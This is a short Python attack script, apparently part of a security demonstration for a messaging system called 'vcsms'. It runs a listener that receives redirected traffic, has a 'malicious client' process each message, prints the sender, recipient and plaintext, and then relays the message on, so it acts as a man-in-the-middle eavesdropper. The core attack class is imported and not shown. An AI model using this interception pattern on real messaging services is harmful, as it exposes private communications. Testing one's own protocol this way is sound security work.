#!/bin/python
import argparse
import socket
import json
import os
import threading
from vcsms.malicious_client import EvilClient
from vcsms.logger import Logger
from vcsms.non_stream_socket import NonStreamSocket

def handle_connection(c: socket.socket, client: EvilClient):
    connect_back = NonStreamSocket(c)
    connect_back.listen()
    recipient = connect_back.recv().decode('utf-8')
    sender, _, parameters = client._message_parser.parse_message(connect_back.recv())
    client._msg_process_thread(client._message_parser.construct_message(sender, "NewMessage", *parameters))
    message = client.receive()[1]
    print(f"{sender} -> {recipient}: {message.decode('utf-8')}")
    client.send(recipient, sender, message)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("listen_port", type=int)
    parser.add_argument("server_addr", type=str)
    parser.add_argument("server_conf", type=str)
    args = parser.parse_args()
    with open(args.server_conf, 'r', encoding='utf-8') as f:
        conf = json.load(f)
    logger = Logger(5, os.path.join("attack_client", "log.txt"))
    client = EvilClient(args.server_addr, conf['port'], conf['fingerprint'], "attack_client", "mrevil123", logger)
    client.run()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", args.listen_port))
    s.listen(30)
    while True:
        c, addr = s.accept()
        t_process = threading.Thread(target=handle_connection, args=(c, client))
        t_process.start()